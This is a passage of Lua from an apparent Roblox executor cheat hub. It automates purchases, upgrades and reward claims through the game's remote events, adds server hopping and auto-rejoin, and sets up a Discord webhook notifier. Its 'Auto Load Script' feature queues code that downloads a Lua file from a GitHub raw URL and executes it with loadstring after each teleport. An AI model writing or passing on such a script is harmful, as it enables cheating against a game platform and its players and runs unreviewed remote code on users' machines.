		local moneyFieldNames = { "Money", "Cash", "Coins", "Currency", "Balance" }

		progressApi.Money = function()
			local saveData = getSaveData()

			if saveData then
				for _, fieldName in ipairs(moneyFieldNames) do
					local moneyValue = tonumber(saveData[fieldName])
					if moneyValue then
						return moneyValue
					end
				end
			end

			local leaderstats = localPlayer:FindFirstChild("leaderstats")

			if leaderstats then
				for _, fieldName in ipairs(moneyFieldNames) do
					local statValue = leaderstats:FindFirstChild(fieldName)
					if statValue and tonumber(statValue.Value) then
						return tonumber(statValue.Value)
					end
				end
			end

			return nil
		end

		progressApi.AddWorker = taskScheduler.Add
		progressApi.Backoff = taskScheduler.Backoff

		local watchedSaveFields = {
			"Money",
			"BaseUpgradeLevel",
			"TreadmillUpgradeLevel",
			"TrailInventory",
			"PendingOfflineMoney",
		}

		local save = gameModules.Save

		if type(save) == "table" and type(save.FieldSignal) == "function" then
			for _, fieldName in ipairs(watchedSaveFields) do
				local ok, fieldSignal = pcall(save.FieldSignal, fieldName)

				if ok and type(fieldSignal) == "table" and type(fieldSignal.Connect) == "function" then
					local ok2, connection = pcall(fieldSignal.Connect, fieldSignal, function()
						taskScheduler.Wake()
					end)

					if ok2 and connection then
						trackCleanup(function()
							pcall(function()
								connection:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local autoBuyTrailToggle = nil
		local sortedTrailsCache = nil
		local purchasedTrailsCache = {}

		local function getSortedTrails()
			local trailsData = safeRequire(function()
				return ReplicatedStorage.Data.Trails
			end)

			local directory = type(trailsData) == "table" and trailsData.Directory or nil
			if type(directory) ~= "table" then
				return {}
			end
			local trailList = {}

			for trailKey, trailData in pairs(directory) do
				if type(trailData) == "table" then
					table.insert(trailList, { Id = tostring(trailData._id or trailKey), Price = tonumber(trailData.Price) or math.huge })
				end
			end

			table.sort(trailList, function(trailA, trailB)
				return trailA.Price < trailB.Price
			end)

			return trailList
		end

		local function autoBuyTrailWorker(workerHandle)
			if not drawingTheme.ReadToggle(autoBuyTrailToggle, false) then
				return false
			end
			sortedTrailsCache = sortedTrailsCache or getSortedTrails()
			local saveData = progressApi.SaveData()
			if not saveData or #sortedTrailsCache == 0 then
				return false
			end
			local trailInventory = type(saveData.TrailInventory) == "table" and saveData.TrailInventory or {}
			local playerMoney = tonumber(saveData.Money) or 0

			for _, trailEntry in ipairs(sortedTrailsCache) do
				if trailInventory[trailEntry.Id] ~= true and not purchasedTrailsCache[trailEntry.Id] and trailEntry.Price <= playerMoney then
					local purchaseOk, purchaseResult = progressApi.Invoke("RF/Trailwear/AskPurchase", trailEntry.Id)
					if purchaseOk and purchaseResult ~= false then
						return true
					end
					purchasedTrailsCache[trailEntry.Id] = true
					progressApi.Backoff(workerHandle)
					return false
				end
			end

			return false
		end

		autoBuyTrailToggle = progressSection:CreateToggle({
			Name = "Auto Buy Trail",
			Note = "Automatically buy available trails when affordable",
			Default = false,
			Callback = function()
				table.clear(purchasedTrailsCache)
				sortedTrailsCache = nil
			end,
		})

		progressApi.AddWorker(autoBuyTrailWorker)
		local autoUpgradeBaseToggle = nil

		local function autoUpgradeBaseWorker()
			if not drawingTheme.ReadToggle(autoUpgradeBaseToggle, false) then
				return false
			end
			local saveData = progressApi.SaveData()
			if not saveData then
				return false
			end

			local basesModule = safeRequire(function()
				return ReplicatedStorage.Data.Bases
			end)

			local basesData = type(basesModule) == "table" and basesModule.BASES or nil
			if type(basesData) ~= "table" then
				return false
			end
			local currentBaseLevel = tonumber(saveData.BaseUpgradeLevel) or 0
			local maxBaseLevel = nil

			if type(basesModule.GetMaxBaseLevel) == "function" then
				local ok, result = pcall(basesModule.GetMaxBaseLevel)
				maxBaseLevel = ok and tonumber(result) or nil
			end

			if maxBaseLevel and currentBaseLevel >= maxBaseLevel then
				return false
			end
			local nextBaseData = basesData[currentBaseLevel + 1]
			local canAfford = type(nextBaseData) == "table" and tonumber(nextBaseData.Cost) or nil

			if canAfford then
				canAfford = (tonumber(saveData.Money) or 0) >= canAfford
			end

			if canAfford then
				return progressApi.Fire("RE/Homestead/AskBaseTierRaise")
			end
			return false
		end

		autoUpgradeBaseToggle = progressSection:CreateToggle({
			Name = "Auto Upgrade Base",
			Note = "Automatically upgrade base when money is available",
			Default = false,
		})

		progressApi.AddWorker(autoUpgradeBaseWorker)
		local autoUpgradeTreadmillToggle = nil

		local function autoUpgradeTreadmillWorker()
			if not drawingTheme.ReadToggle(autoUpgradeTreadmillToggle, false) then
				return false
			end
			local saveData = progressApi.SaveData()
			if not saveData then
				return false
			end

			local treadmillsModule = safeRequire(function()
				return ReplicatedStorage.Data.Treadmills
			end)

			if type(treadmillsModule) ~= "table" or type(treadmillsModule.GetByUpgradeLevel) ~= "function" then
				return false
			end
			local ok, nextTreadmill = pcall(treadmillsModule.GetByUpgradeLevel, (tonumber(saveData.TreadmillUpgradeLevel) or 0) + 1)
			if not ok or type(nextTreadmill) ~= "table" then
				return false
			end
			local treadmillId = nextTreadmill._id
			local treadmillPrice = tonumber(nextTreadmill.Price) or math.huge
			local canAfford = type(treadmillId) == "string"

			if canAfford then
				canAfford = (tonumber(saveData.Money) or 0) >= treadmillPrice
			end

			if canAfford then
				local upgradeOk, upgradeResult = progressApi.Invoke("RF/Treadmill/AskTierRaise", treadmillId)
				return upgradeOk and upgradeResult ~= false
			end
			return false
		end

		autoUpgradeTreadmillToggle = progressSection:CreateToggle({
			Name = "Auto Upgrade Treadmill",
			Note = "Automatically upgrade treadmill when money is available",
			Default = false,
		})

		progressApi.AddWorker(autoUpgradeTreadmillWorker)
		local rewardCheckInterval = 15
		local autoCollectRewardsToggle = nil
		local rewardCheckTimer = 15
		local lastRewardCheckTime = os.clock()

		local function autoCollectRewardsWorker()
			if not drawingTheme.ReadToggle(autoCollectRewardsToggle, false) then
				return false
			end
			local currentTime = os.clock()
			rewardCheckTimer += currentTime - lastRewardCheckTime
			lastRewardCheckTime = currentTime
			local pendingMoney = progressApi.SaveData()
			pendingMoney = pendingMoney and tonumber(pendingMoney.PendingOfflineMoney) or nil

			if pendingMoney == nil then
				local checkOk, checkResult = progressApi.Invoke("RF/AwayEarnings/PendingCheck")
				pendingMoney = checkOk and checkResult ~= false and checkResult ~= nil and 1 or 0
			end

			local collectedAny = false

			if pendingMoney > 0 then
				local collectOk, collectResult = progressApi.Invoke("RF/AwayEarnings/AskCollect")
				collectedAny = collectOk and collectResult ~= false
			end

			if rewardCheckInterval <= rewardCheckTimer then
				rewardCheckTimer = 0
				local redeemOk, redeemResult = progressApi.Invoke("RF/Codex/AskRedeemAll")
				collectedAny = collectedAny or redeemOk and redeemResult ~= false
				progressApi.Invoke("RF/Codex/AskRedeemLimitedEgg")
			end

			return collectedAny
		end

		autoCollectRewardsToggle = progressSection:CreateToggle({
			Name = "Auto Claim",
			Note = "Claim offline money & index rewards",
			Default = false,
			Callback = function()
				rewardCheckTimer = rewardCheckInterval
			end,
		})

		progressApi.AddWorker(autoCollectRewardsWorker)
	end

	chilliState.IndexClaimHandle = progressSection:CreateToggle({
		Name = "Auto Claim Index",
		Note = "Claim index rewards as soon as they unlock",
		Default = false,
		Callback = function()
			if type(chilliState.IndexClaimRestart) == "function" then
				chilliState.IndexClaimRestart()
			end
		end,
	})

	local showNotification = function(title, message)
		if type(chilliLib.Notify) == "function" then
			pcall(chilliLib.Notify, title, message, 5)
		end
	end

	local serverSection, autoLoadScriptWorker
	-- ══════════════════════════════════════════════════════════════════════════
	-- 🌐 [SECTION 5] SERVER TAB - SERVER HOP, REJOIN & JOB ID
	-- ══════════════════════════════════════════════════════════════════════════
	serverSection = hubWindow:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
	local TeleportService
	TeleportService = game:GetService("TeleportService")
	local HttpService
	HttpService = game:GetService("HttpService")
	local GuiService
	GuiService = game:GetService("GuiService")

	do
		local function findQueueOnTeleport()
			if type(queue_on_teleport) == "function" then
				return queue_on_teleport
			end

			if type(queueonteleport) == "function" then
				return queueonteleport
			end

			if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
				return syn.queue_on_teleport
			end

			if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
				return fluxus.queue_on_teleport
			end
			return nil
		end

		local function setAutoLoadScript(enabled)
			pcall(function()
				TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", enabled)
			end)

			if not enabled then
				return true
			end
			local queueFunc = findQueueOnTeleport()
			if not queueFunc then
				return false
			end

			if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
				if not pcall(queueFunc, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(1.5)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
					return false
				end

				_G.__ChilliAutoLoadQueued = true
			end

			return true
		end

		local autoLoadScriptToggle = nil

		autoLoadScriptWorker = function()
			if autoLoadScriptToggle and chilliState.Toggle(autoLoadScriptToggle, false) then
				setAutoLoadScript(true)
			end
		end

		autoLoadScriptToggle = serverSection:CreateToggle({
			Name = "Auto Load Script",
			Default = true,
			Callback = function(enabledState)
				local shouldEnable = enabledState == true

				if not setAutoLoadScript(shouldEnable) and shouldEnable then
					task.defer(function()
						setAutoLoadScript(false)

						if autoLoadScriptToggle and type(autoLoadScriptToggle.Set) == "function" then
							pcall(autoLoadScriptToggle.Set, autoLoadScriptToggle, false, false)
						end

						showNotification("Auto Load Unavailable", "This executor does not support queue on teleport.")
					end)
				end
			end,
		})

		local serverHopMode = "Least Players"
		local teleportTimeout = 10
		local teleportStartTime = 0
		local targetJobId = nil
		local failedJobIds = {}
		local isServerHopping = false
		local serverHopAttempts = 0
		local teleportWasDenied = false
		local cachedServerList = nil
		local cachedForMode = ""
		local cacheTimestamp = 0
		local serverCacheDuration = 60

		local function markTeleportFailed(jobId)
			teleportStartTime = 0
			targetJobId = nil

			if jobId then
				failedJobIds[jobId] = true
			end
		end

		pcall(function()
			TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
				if not targetJobId then
					return
				end
				markTeleportFailed(targetJobId)
				teleportWasDenied = true

				if not isServerHopping then
					showNotification("Server Hop Failed", tostring(errorMessage ~= "" and errorMessage or teleportResult))
				end
			end)
		end)

		local function fetchServerList(sortMode)
			local currentJobId = tostring(game.JobId or "")
			local serverList = {}
			local isRandomMode = sortMode == "Random"
			local sortOrder = sortMode == "Least Players" and "Asc" or "Desc"
			local maxPagesToFetch = isRandomMode and 3 or 6
			local paginationCursor = nil

			for pageIndex = 1, maxPagesToFetch do
				local apiUrl = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, sortOrder)

				if paginationCursor and paginationCursor ~= "" then
					apiUrl ..= "&cursor=" .. HttpService:UrlEncode(paginationCursor)
				end

				local ok, response = pcall(function()
					return HttpService:JSONDecode(game:HttpGet(apiUrl))
				end)

				if not ok or type(response) ~= "table" then
					return serverList, false
				end
				local ipairsFunc = ipairs
				local serverData = response.data or {}

				for _, serverInfo in ipairsFunc(serverData) do
					local serverId = tostring(serverInfo.id or "")
					local playingCount = tonumber(serverInfo.playing) or math.huge
					local maxPlayers = tonumber(serverInfo.maxPlayers) or 0

					if serverId ~= "" and serverId ~= currentJobId and playingCount < maxPlayers then
						serverList[#serverList + 1] = { Id = serverId, Playing = playingCount, Room = maxPlayers - playingCount }
					end
				end

				if #serverList > 0 and not isRandomMode then
					break
				end
				paginationCursor = response.nextPageCursor
				if not paginationCursor or paginationCursor == "" then
					break
				end
			end

			return serverList, true
		end

		local function performServerHop(hopMode)
			local availableServers

			if cachedServerList and cachedForMode == hopMode and os.clock() - cacheTimestamp < serverCacheDuration then
				availableServers = cachedServerList
			else
				local fetchSuccess
				availableServers, fetchSuccess = fetchServerList(hopMode)
				if not fetchSuccess then
					return "fetch"
				end
				cachedServerList = availableServers
				cachedForMode = hopMode
				cacheTimestamp = os.clock()
			end

			local function filterByAvailableSlots(minSlots)
				local filtered = {}

				for _, serverInfo in ipairs(availableServers) do
					if not failedJobIds[serverInfo.Id] and serverInfo.Room >= minSlots then
						filtered[#filtered + 1] = serverInfo
					end
				end

				return filtered
			end

			local viableServers = filterByAvailableSlots(2)

			if #viableServers == 0 then
				viableServers = filterByAvailableSlots(1)
			end

			if #viableServers == 0 and next(failedJobIds) ~= nil then
				table.clear(failedJobIds)
				viableServers = filterByAvailableSlots(1)
			end

			if #viableServers == 0 then
				markTeleportFailed(nil)
				cachedServerList = nil
				return "empty"
			end

			local selectedJobId

			if hopMode == "Random" then
				selectedJobId = viableServers[math.random(1, #viableServers)].Id
			else
				table.sort(viableServers, function(serverA, serverB)
					if hopMode == "Least Players" then
						return serverA.Playing < serverB.Playing
					end
					return serverA.Playing > serverB.Playing
				end)

				selectedJobId = viableServers[1].Id
			end

			teleportWasDenied = false
			targetJobId = selectedJobId
			teleportStartTime = os.clock() + teleportTimeout
			pcall(autoLoadScriptWorker)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, selectedJobId, localPlayer)
			end) then
				markTeleportFailed(selectedJobId)
				return "failed"
			end

			local timeoutDeadline = os.clock() + teleportTimeout

			while os.clock() < timeoutDeadline do
				if teleportWasDenied then
					return "denied"
				end
				task.wait(0.25)
			end

			return "waiting"
		end

		chilliState.ServerHop = performServerHop

		serverSection:CreateDropdown({
			Name = "Server Hop Mode",
			Options = { "Most Players", "Random", "Least Players" },
			Default = "Least Players",
			Callback = function(selectedMode)
				serverHopMode = tostring(selectedMode or "Least Players")
			end,
		})

		serverSection:CreateButton({
			Name = "Server Hop",
			ButtonText = "Hop",
			Callback = function()
				serverHopAttempts += 1
				local currentAttemptId = serverHopAttempts

				task.spawn(function()
					isServerHopping = true
					local retryAttempts = 0

					while currentAttemptId == serverHopAttempts do
						retryAttempts += 1
						local hopStatus = performServerHop(serverHopMode)

						if not (hopStatus == "waiting" or currentAttemptId ~= serverHopAttempts) then
							if hopStatus == "empty" then
								cachedServerList = nil
								table.clear(failedJobIds)
							end

							if retryAttempts % 10 == 0 then
								showNotification("Server Hop", string.format("Every server was full so far, %d tries.", retryAttempts))
							end

							task.wait(hopStatus == "fetch" and 1 or 0.1)
							continue
						end

						break
					end

					if currentAttemptId == serverHopAttempts then
						isServerHopping = false
					end
				end)
			end,
		})
	end

	do
		local jobIdTeleportTimeout = 8
		local jobIdTeleportStart = 0
		local lastJobIdInput = ""
		local jobIdInputWidget = nil

		local function isJobIdTeleporting()
			return os.clock() < jobIdTeleportStart
		end

		local function setJobIdTeleporting(isTeleporting)
			jobIdTeleportStart = isTeleporting and os.clock() + jobIdTeleportTimeout or 0
		end

		local function cleanJobIdString(rawInput)
			local trimmed = tostring(rawInput or ""):match("^%s*(.-)%s*$")
			return trimmed:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or trimmed
		end

		local function getJobIdFromInputOrClipboard()
			local savedInput = lastJobIdInput
			local inputValue = lastJobIdInput

			if jobIdInputWidget then
				local ok

				ok, inputValue = pcall(function()
					local controller = jobIdInputWidget._controller
					return controller and controller.GetValue and controller.GetValue()
				end)

				if not (ok and type(inputValue) == "string" and inputValue ~= "") then
					local foundValue = nil

					for _, methodName in ipairs({ "Get", "GetValue", "GetText" }) do
						local ok2, method = pcall(function()
							return jobIdInputWidget[methodName]
						end)

						if ok2 and type(method) == "function" then
							local ok3
							ok3, inputValue = pcall(method, jobIdInputWidget)
							if ok3 and type(inputValue) == "string" and inputValue ~= "" then
								foundValue = 1
								break
							end
						end
					end

					if foundValue ~= 1 then
						inputValue = savedInput
					end
				end
			end

			local cleanedJobId = cleanJobIdString(inputValue)

			if cleanedJobId == "" then
				local ok, clipboardContent = pcall(function()
					local getClipFunc = getclipboard or readclipboard or getrbxclipboard
					return type(getClipFunc) == "function" and getClipFunc() or nil
				end)

				if ok and type(clipboardContent) == "string" then
					cleanedJobId = cleanJobIdString(clipboardContent)
				end
			end

			return cleanedJobId
		end

		local function setJobIdInputValue(newValue)
			if not jobIdInputWidget then
				return
			end

			pcall(function()
				local controller = jobIdInputWidget._controller

				if controller and controller.SetValue then
					controller.SetValue(newValue, false)
				end
			end)

			lastJobIdInput = cleanJobIdString(newValue)
		end

		local function rejoinCurrentServer(errorTitle)
			setJobIdTeleporting(true)
			pcall(autoLoadScriptWorker)

			if not pcall(function()
				if game.JobId ~= "" then
					TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
				else
					TeleportService:Teleport(game.PlaceId, localPlayer)
				end
			end) then
				setJobIdTeleporting(false)
				showNotification(errorTitle, "Roblox could not rejoin the server.")
			end
		end

		pcall(function()
			TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
				if not isJobIdTeleporting() then
					return
				end
				setJobIdTeleporting(false)
				showNotification("Teleport Failed", tostring(errorMessage ~= "" and errorMessage or teleportResult))
			end)
		end)

		jobIdInputWidget = serverSection:CreateInput({
			Name = "Job ID",
			Placeholder = "Paste a server Job ID...",
			Default = "",
			MaxLength = 100,
			Callback = function(inputValue)
				lastJobIdInput = cleanJobIdString(inputValue)
			end,
		})

		if jobIdInputWidget then
			jobIdInputWidget._configIgnored = true

			if jobIdInputWidget.State and not jobIdInputWidget.State._registered then
				jobIdInputWidget.State._configIgnored = true
			end
		end

		serverSection:CreateButton({
			Name = "Join Job ID",
			ButtonText = "Join",
			Callback = function()
				if isJobIdTeleporting() then
					showNotification("Join Job ID Failed", "A teleport is already running, try again shortly.")
					return
				end
				local targetJobId = getJobIdFromInputOrClipboard()
				if targetJobId == "" then
					showNotification("Join Job ID Failed", "Paste a valid Job ID first.")
					return
				end
				setJobIdTeleporting(true)
				pcall(autoLoadScriptWorker)

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, localPlayer)
				end) then
					setJobIdTeleporting(false)
					showNotification("Join Job ID Failed", "Roblox could not join that server.")
				end
			end,
		})

		serverSection:CreateButton({
			Name = "Copy Current Job ID",
			ButtonText = "Copy",
			Callback = function()
				local currentJobId = tostring(game.JobId or "")
				setJobIdInputValue(currentJobId)
				local setClipFunc = setclipboard or toclipboard
				showNotification((type(setClipFunc) == "function" and pcall(setClipFunc, currentJobId) or false) and "Job ID Copied" or "Job ID Shown", currentJobId)
			end,
		})

		serverSection:CreateButton({
			Name = "Rejoin Server",
			ButtonText = "Rejoin",
			Callback = function()
				if isJobIdTeleporting() then
					showNotification("Rejoin Failed", "A teleport is already running, try again shortly.")
					return
				end
				rejoinCurrentServer("Rejoin Failed")
			end,
		})

		local disconnectHandler = { Option = nil, Fired = false, TeleportingAt = 0 }

		local function isRobloxErrorPromptVisible()
			local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
			robloxPromptGui = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
			return robloxPromptGui ~= nil and robloxPromptGui:FindFirstChild("ErrorPrompt") ~= nil
		end

		pcall(function()
			local connection = localPlayer.OnTeleport:Connect(function(teleportState)
				if teleportState == Enum.TeleportState.Failed then
					disconnectHandler.TeleportingAt = 0
				else
					disconnectHandler.TeleportingAt = os.clock()
				end
			end)

			trackCleanup(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)

		disconnectHandler.Option = serverSection:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

		local function handleDisconnectError(errorMessage)
			if disconnectHandler.Fired or disconnectHandler.Option == nil or not chilliState.Toggle(disconnectHandler.Option, false) or isJobIdTeleporting() then
				return
			end
			local isTeleporting = disconnectHandler.TeleportingAt > 0

			if isTeleporting then
				local teleportStartedAt = disconnectHandler.TeleportingAt
				isTeleporting = os.clock() - teleportStartedAt < 60
			end

			if isTeleporting then
				return
			end
			local errorText = string.lower(tostring(errorMessage or ""))
			if errorText == "" or string.find(errorText, "teleport", 1, true) then
				return
			end
			local errorCode = nil

			pcall(function()
				errorCode = GuiService:GetErrorCode()
			end)

			if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(errorText, "banned", 1, true) or string.find(errorText, "same account", 1, true) then
				return
			end
			disconnectHandler.Fired = true
			local placeId = game.PlaceId
			local currentJobId = tostring(game.JobId or "")
			local isServerShutdown = string.find(errorText, "shut", 1, true) ~= nil or string.find(errorText, "no longer", 1, true) ~= nil or string.find(errorText, "closed", 1, true) ~= nil
			pcall(autoLoadScriptWorker)
			showNotification("Auto Rejoin", isServerShutdown and "Server closed, joining another one." or "Disconnected, rejoining now.")

			task.spawn(function()
				local rejoinAttempts = 0

				while true do
					rejoinAttempts += 1
					local shouldRejoinSame = not isServerShutdown and currentJobId ~= "" and rejoinAttempts <= 2

					pcall(function()
						if shouldRejoinSame then
							TeleportService:TeleportToPlaceInstance(placeId, currentJobId, localPlayer)
						else
							TeleportService:Teleport(placeId, localPlayer)
						end
					end)

					task.wait(shouldRejoinSame and 4 or 5)
				end
			end)
		end

		pcall(function()
			local connection = GuiService.ErrorMessageChanged:Connect(function(newErrorMessage)
				task.wait(0.3)

				if isRobloxErrorPromptVisible() then
					handleDisconnectError(newErrorMessage)
				end
			end)

			trackCleanup(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)

		task.spawn(function()
			local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
			robloxPromptGui = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
			if not robloxPromptGui then
				return
			end

			local connection = robloxPromptGui.ChildAdded:Connect(function(child)
				if child.Name ~= "ErrorPrompt" then
					return
				end
				task.wait(0.2)
				local errorText = ""

				for _, descendant in ipairs(child:GetDescendants()) do
					if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
						errorText = descendant.Text
					end
				end

				if errorText == "" then
					pcall(function()
						errorText = GuiService:GetErrorMessage()
					end)
				end

				handleDisconnectError(errorText ~= "" and errorText or "disconnected")
			end)

			trackCleanup(function()
				pcall(function()
					connection:Disconnect()
				end)
			end)
		end)
	end

	do
		local AssetService = game:GetService("AssetService")
		local httpRequest = syn and syn.request or http and http.request or http_request or request

		local webhookConfig = {
			Url = "",
			Stolen = false,
			PingEveryone = false,
			Queue = {},
			Sending = false,
			Notified = {},
			Icons = {},
			Pngs = {},
			Crc = {},
			Known = nil,
			Carry = nil,
			Avatar = nil,
			Disposed = false,
			Path = "ChilliLibrary/SAE_Webhook.txt",
			Saved = "",
			LoadedAt = os.clock(),
			Input = nil,
			Dot = "  " .. utf8.char(183) .. "  ",
			MaxSide = 200,
			Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
			Emoji = {
				Value = "<:sae_value:1551645680718581871>",
				Size = "<:sae_size:1551645444285800558>",
				Mutation = "<:sae_mutation:1551677914146275478>",
				Area = "<:sae_area:1551675973328441416>",
			},
		}

		pcall(function()
			if type(readfile) ~= "function" then
				return
			end

			if type(isfile) == "function" and not isfile(webhookConfig.Path) then
				return
			end
			local savedUrl = string.gsub(tostring(readfile(webhookConfig.Path) or ""), "%s", "")
			webhookConfig.Saved = savedUrl
			webhookConfig.Url = savedUrl
		end)

		for byteIndex = 0, 255 do
			local crcValue = byteIndex

			for bitIndex = 1, 8 do
				if bit32.band(crcValue, 1) == 1 then
					crcValue = bit32.bxor(3988292384, bit32.rshift(crcValue, 1))
				else
					crcValue = bit32.rshift(crcValue, 1)
				end
			end

			webhookConfig.Crc[byteIndex] = crcValue
		end

		local function isValidDiscordWebhook(url)
			if type(url) ~= "string" then
				return false
			end

			for _, domain in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
				if string.match(url, "^https://" .. domain .. "/api/webhooks/%d+/[%w%-_]+$") then
					return true
				end
			end

			return false
		end

		local function fetchJson(url)
			if type(httpRequest) ~= "function" then
				return nil
			end
			local ok, response = pcall(httpRequest, { Url = url, Method = "GET" })
			if not ok or type(response) ~= "table" or tonumber(response.StatusCode) ~= 200 then
				return nil
			end
			local ok2, jsonData = pcall(HttpService.JSONDecode, HttpService, tostring(response.Body))
			return ok2 and jsonData or nil
		end

		local function extractImageUrl(jsonResponse, requireImagePath)
			local firstEntry = type(jsonResponse) == "table" and type(jsonResponse.data) == "table" and jsonResponse.data[1] or nil
			if type(firstEntry) ~= "table" or firstEntry.state ~= "Completed" or type(firstEntry.imageUrl) ~= "string" or firstEntry.imageUrl == "" then
				return nil
			end

			if requireImagePath and not string.find(firstEntry.imageUrl, "/Image/", 1, true) then
				return nil
			end
			return firstEntry.imageUrl
		end

		local function getAssetThumbnail(assetId)
			if webhookConfig.Icons[assetId] == nil then
				webhookConfig.Icons[assetId] = extractImageUrl(fetchJson("https://thumbnails.roblox.com/v1/assets?assetIds=" .. assetId .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
			end

			return webhookConfig.Icons[assetId] or nil
		end

		local function getPlayerAvatarUrl()
			if webhookConfig.Avatar == nil then
				webhookConfig.Avatar = extractImageUrl(fetchJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
			end

			return webhookConfig.Avatar or nil
		end

		local function calculateCrc32(bufferData, startOffset, endOffset)
			local crcTable = webhookConfig.Crc
			local crc = 4294967295

			for bytePos = startOffset, endOffset do
				local rshiftFunc = bit32.rshift
				crc = bit32.bxor(crcTable[bit32.band(bit32.bxor(crc, buffer.readu8(bufferData, bytePos)), 255)], rshiftFunc(crc, 8))
			end

			return bit32.bxor(crc, 4294967295)
		end

		local function encodeToPng(imageBuffer, imageWidth, imageHeight)
			local bytesPerPixel = imageWidth * 4 + 1
			local totalImageBytes = bytesPerPixel * imageHeight
			local compressedSize = 2 + math.ceil(totalImageBytes / 65535) * 5 + totalImageBytes + 4
			local pngBuffer = buffer.create(45 + compressedSize + 12)
			local writeOffset = 0

			local function writeByte(byteValue)
				buffer.writeu8(pngBuffer, writeOffset, byteValue)
				writeOffset += 1
			end

			local function writeU32BigEndian(value)
				writeByte(bit32.band(bit32.rshift(value, 24), 255))
				writeByte(bit32.band(bit32.rshift(value, 16), 255))
				writeByte(bit32.band(bit32.rshift(value, 8), 255))
				writeByte(bit32.band(value, 255))
			end

			local function writeFourBytes(byte1, byte2, byte3, byte4)
				writeByte(byte1)
				writeByte(byte2)
				writeByte(byte3)
				writeByte(byte4)
			end

			for _, headerByte in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
				writeByte(headerByte)
			end

			writeU32BigEndian(13)
			writeFourBytes(73, 72, 68, 82)
			writeU32BigEndian(imageWidth)
			writeU32BigEndian(imageHeight)
			writeByte(8)
			writeByte(6)
			writeByte(0)
			writeByte(0)
			writeByte(0)
			writeU32BigEndian(calculateCrc32(pngBuffer, writeOffset, writeOffset - 1))
			local rawPixelBuffer = buffer.create(totalImageBytes)

			for rowIndex = 0, imageHeight - 1 do
				buffer.writeu8(rawPixelBuffer, rowIndex * bytesPerPixel, 0)
				buffer.copy(rawPixelBuffer, rowIndex * bytesPerPixel + 1, imageBuffer, rowIndex * imageWidth * 4, imageWidth * 4)
			end

			writeU32BigEndian(compressedSize)
			local idatChunkStart = writeOffset
			writeFourBytes(73, 68, 65, 84)
			writeByte(120)
			writeByte(1)
			local compressedOffset = 0

			while compressedOffset < totalImageBytes do
				local blockSize = math.min(65535, totalImageBytes - compressedOffset)
				writeByte(compressedOffset + blockSize >= totalImageBytes and 1 or 0)
				writeByte(bit32.band(blockSize, 255))
				writeByte(bit32.rshift(blockSize, 8))
				local blockComplement = bit32.band(bit32.bnot(blockSize), 65535)
				writeByte(bit32.band(blockComplement, 255))
				writeByte(bit32.rshift(blockComplement, 8))
				buffer.copy(pngBuffer, writeOffset, rawPixelBuffer, compressedOffset, blockSize)
				writeOffset += blockSize
				compressedOffset += blockSize
			end

			local adler32A = 1
			local adler32B = 0

			for bytePos = 0, totalImageBytes - 1 do
				adler32A = (adler32A + buffer.readu8(rawPixelBuffer, bytePos)) % 65521
				adler32B = (adler32B + adler32A) % 65521
			end

			writeU32BigEndian(adler32B * 65536 + adler32A)
			writeU32BigEndian(calculateCrc32(pngBuffer, idatChunkStart, writeOffset - 1))
			writeU32BigEndian(0)
			writeFourBytes(73, 69, 78, 68)
			writeU32BigEndian(calculateCrc32(pngBuffer, writeOffset, writeOffset - 1))
			return buffer.tostring(pngBuffer)
		end

		local function getAssetPngData(assetId)
			if webhookConfig.Pngs[assetId] ~= nil then
				return webhookConfig.Pngs[assetId] or nil
			end

			local ok, pngData = pcall(function()
				local editableImage = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. assetId))
				local imageSize = editableImage.Size
				local originalWidth = math.floor(imageSize.X)
				local originalHeight = math.floor(imageSize.Y)
				local pixelBuffer = editableImage:ReadPixelsBuffer(Vector2.zero, imageSize)

				pcall(function()
					editableImage:Destroy()
				end)

				local scaleFactor = math.min(1, webhookConfig.MaxSide / math.max(originalWidth, originalHeight))
				local scaledWidth = math.max(1, math.floor(originalWidth * scaleFactor))
